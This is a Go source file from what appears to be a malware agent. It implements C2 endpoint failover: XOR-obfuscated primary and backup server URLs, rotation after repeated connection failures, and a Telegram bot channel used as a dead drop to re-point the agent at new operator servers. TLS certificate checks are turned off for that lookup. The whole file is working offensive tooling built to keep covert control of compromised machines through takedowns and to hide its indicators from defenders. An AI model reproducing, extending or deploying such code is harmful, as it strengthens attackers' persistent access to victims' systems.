// C2 endpoint failover controller.
//
// Replaces the single hardcoded C2 URL with a tiered endpoint list:
//
//	tier 0  env C2_SERVER   (runtime override — .cmd wrapper keeps working)
//	tier 1  baked primary   (xor.go eWssURL, XOR-obfuscated, survives reboot)
//	tier 2  baked backup    (xor.go eWssURL2 — set when backup domain registered)
//	tier 3  baked backup 2  (xor.go eWssURL3)
//	+ Telegram bootstrap: when every tier has failed, the agent reads the
//	  operator's latest C2ENDPOINT message via the bot API and re-points itself.
//
// On N consecutive connect failures (default 3) the controller advances to the
// next tier by swapping config.C2Server, so pickDialURL()/beaconURL()/chisel
// helpers all follow without touching their call sites. A full failed cycle
// triggers Telegram rediscovery (async, rate-limited to 1 attempt / 10 min).
//
// Env switches: C2_FAILOVER=0 disables (lab debugging),
// C2_FAILOVER_THRESHOLD=<n> overrides the per-tier failure count (default 3).
package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

type c2Failover struct {
	mu         sync.Mutex
	tiers      []string // full endpoint URLs, index 0 = highest priority
	idx        int      // active tier
	fails      int      // consecutive failures on active tier
	fullCycles int      // completed failed rounds through all tiers
	tgTriedAt  time.Time
	enabled    bool
	threshold  int
}

var c2fo = &c2Failover{}

// initC2Failover builds the tier list and applies tier 0. Call once after
// loadConfig() has populated the global config (main / runAgentCore).
func initC2Failover() {
	c2fo.mu.Lock()
	defer c2fo.mu.Unlock()
	c2fo.enabled = strings.TrimSpace(getEnv(xob(eC2Failover), "1")) != "0"
	c2fo.threshold = parseInt(getEnv(xob(eC2FailoverThreshold), "3"), 3)
	if c2fo.threshold < 1 {
		c2fo.threshold = 1
	}
	c2fo.tiers = nil
	if s := strings.TrimSpace(getEnv(xob(eC2Server), "")); s != "" {
		c2fo.tiers = append(c2fo.tiers, s)
	}
	if s := ldDecode(ldC2Server); s != "" && !c2TierContains(c2fo.tiers, s) {
		c2fo.tiers = append(c2fo.tiers, s)
	}
	for _, enc := range [][]byte{eWssURL, eWssURL2, eWssURL3} {
		if s := strings.TrimSpace(xob(enc)); s != "" && !c2TierContains(c2fo.tiers, s) {
			c2fo.tiers = append(c2fo.tiers, s)
		}
	}
	if len(c2fo.tiers) == 0 {
		// Nothing baked and no env override — lab loopback (XOR'd).
		if s := strings.TrimSpace(xob(eLabWss)); s != "" {
			c2fo.tiers = append(c2fo.tiers, s)
		}
	}
	c2fo.idx, c2fo.fails, c2fo.fullCycles = 0, 0, 0
	c2ApplyTierLocked()
}

func c2TierContains(tiers []string, s string) bool {
	for _, t := range tiers {
		if t == s {
			return true
		}
	}
	return false
}

// c2ApplyTierLocked swaps the active endpoint into the live config so every
// consumer (pickDialURL, beaconURL, socks helpers) follows automatically.
// Callers must hold c2fo.mu.
func c2ApplyTierLocked() {
	if len(c2fo.tiers) == 0 {
		return
	}
	t := c2fo.tiers[c2fo.idx]
	config.C2Server = t
	if u, err := url.Parse(t); err == nil && u.Path != "" && u.Path != "/" {
		config.WSPath = u.Path
	}
	if config.Transport == "http" {
		config.BeaconURL = t
	}
}

// c2NoteConnectFailure records a failed dial/register/beacon attempt. After
// `threshold` consecutive failures the agent advances to the next tier; a full
// failed cycle triggers async Telegram rediscovery.
func c2NoteConnectFailure() {
	c2fo.mu.Lock()
	if !c2fo.enabled || len(c2fo.tiers) == 0 {
		c2fo.mu.Unlock()
		return
	}
	c2fo.fails++
	if c2fo.fails < c2fo.threshold {
		c2fo.mu.Unlock()
		return
	}
	c2fo.fails = 0
	c2fo.idx++
	wrapped := false
	if c2fo.idx >= len(c2fo.tiers) {
		c2fo.idx = 0
		c2fo.fullCycles++
		wrapped = true
	}
	c2ApplyTierLocked()
	next := ""
	if c2fo.idx < len(c2fo.tiers) {
		next = c2fo.tiers[c2fo.idx]
	}
	fmt.Fprintf(os.Stderr, "failover: advancing to tier %d (%s)\n", c2fo.idx, next)
	c2fo.mu.Unlock()
	if wrapped {
		go c2TelegramDiscover()
	}
}

func c2NoteConnectSuccess() {
	c2fo.mu.Lock()
	defer c2fo.mu.Unlock()
	c2fo.fails = 0
	c2fo.fullCycles = 0
}

// c2CurrentEndpoint returns the active tier URL (diagnostics / debug line).
func c2CurrentEndpoint() string {
	c2fo.mu.Lock()
	defer c2fo.mu.Unlock()
	if len(c2fo.tiers) == 0 {
		return ""
	}
	return c2fo.tiers[c2fo.idx]
}

// c2AddEndpoint prepends a freshly discovered endpoint (Telegram bootstrap or
// operator push) and re-points the agent at it. Returns false for invalid input.
func c2AddEndpoint(ep string) bool {
	ep = strings.TrimSpace(ep)
	if ep == "" {
		return false
	}
	u, err := url.Parse(ep)
	if err != nil || u.Host == "" {
		return false
	}
	switch strings.ToLower(u.Scheme) {
	case "ws", "wss", "http", "https":
	default:
		return false
	}
	c2fo.mu.Lock()
	defer c2fo.mu.Unlock()
	next := make([]string, 0, len(c2fo.tiers)+1)
	next = append(next, ep)
	for _, t := range c2fo.tiers {
		if t != ep {
			next = append(next, t)
		}
	}
	c2fo.tiers = next
	c2fo.idx = 0
	c2fo.fails = 0
	c2ApplyTierLocked()
	return true
}

var c2EndpointRe = regexp.MustCompile(xob(eEndpointRe))

// c2ParseTGEndpoint picks the newest valid C2ENDPOINT line from message texts
// (oldest→newest order). Empty when nothing matches.
func c2ParseTGEndpoint(texts []string) string {
	for i := len(texts) - 1; i >= 0; i-- {
		m := c2EndpointRe.FindStringSubmatch(texts[i])
		if len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

type tgUpdate struct {
	UpdateID int64 `json:"update_id"`
	Message  *struct {
		Date int64 `json:"date"`
		Chat struct {
			ID int64 `json:"id"`
		} `json:"chat"`
		Text string `json:"text"`
	} `json:"message"`
}

// c2TelegramDiscover reads the operator's bootstrap channel via the Telegram
// bot API and re-points the agent at the latest published endpoint. Runs only
// when every baked tier has failed; rate-limited to one attempt per 10 min.
// getUpdates without an offset does not confirm/consume the updates, so every
// agent instance can independently see the latest message until it expires
// server-side (~24h) — re-publish after each rotation.
func c2TelegramDiscover() {
	token := strings.TrimSpace(xob(eTgBotToken))
	if token == "" {
		return // bootstrap channel not configured
	}
	c2fo.mu.Lock()
	if time.Since(c2fo.tgTriedAt) < 10*time.Minute {
		c2fo.mu.Unlock()
		return
	}
	c2fo.tgTriedAt = time.Now()
	c2fo.mu.Unlock()

	base := strings.TrimSpace(xob(eTgAPIBase))
	if base == "" {
		return // bootstrap API base not baked — channel disabled
	}
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			// Tolerate aggressive middleboxes on foreign networks; the payload
			// is just an endpoint URL, and the agent already trusts its C2 TLS.
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Get(base + "/bot" + token + "/getUpdates?limit=100&timeout=0")
	if err != nil {
		fmt.Fprintf(os.Stderr, "failover: bootstrap lookup failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return
	}
	var updates struct {
		OK     bool       `json:"ok"`
		Result []tgUpdate `json:"result"`
	}
	if err := json.Unmarshal(body, &updates); err != nil || !updates.OK {
		return
	}
	wantChat := strings.TrimSpace(xob(eTgChatID))
	var texts []string
	for _, u := range updates.Result {
		if u.Message == nil || u.Message.Text == "" {
			continue
		}
		if wantChat != "" {
			if cs := strconv.FormatInt(u.Message.Chat.ID, 10); cs != wantChat {
				continue
			}
		}
		texts = append(texts, u.Message.Text)
	}
	if len(texts) > 50 {
		texts = texts[len(texts)-50:]
	}
	if ep := c2ParseTGEndpoint(texts); ep != "" {
		if c2AddEndpoint(ep) {
			fmt.Fprintf(os.Stderr, "failover: endpoint rediscovered via bootstrap channel\n")
		}
	}
}

// firstNonEmptyOf returns the first value with non-blank content.
func firstNonEmptyOf(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}
